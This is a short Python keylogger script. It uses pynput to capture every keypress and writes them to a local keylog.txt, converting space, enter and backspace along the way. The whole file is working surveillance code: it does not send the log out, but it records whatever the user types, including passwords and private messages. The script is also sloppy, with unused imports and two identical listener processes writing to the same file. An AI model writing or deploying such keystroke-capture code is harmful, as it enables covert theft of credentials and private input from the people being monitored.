import random
import time
from multiprocessing import Process
from pynput.keyboard import Listener
import pyperclip
import threading

with open('keylog.txt', 'w') as f:
    f.write("Start of recording\n")


def controller(key):
    file_log = f'keylog.txt'
    with open(file_log, 'r') as f:
        data = f.read()

    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = " "
    if letter == "Key.shift":
        letter = ""
    if letter == "Key.backspace":
        data = data[:-1]
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    data += letter
    with open(file_log, 'w') as f:
        f.write(data)

    print("WORK")


def start():
    with Listener(on_press=controller) as l:
        l.join()


if __name__ == "__main__":
    print("Hello from main Process")
    proc1 = Process(target=start)
    proc1.start()
    proc2 = Process(target=start)
    proc2.start()
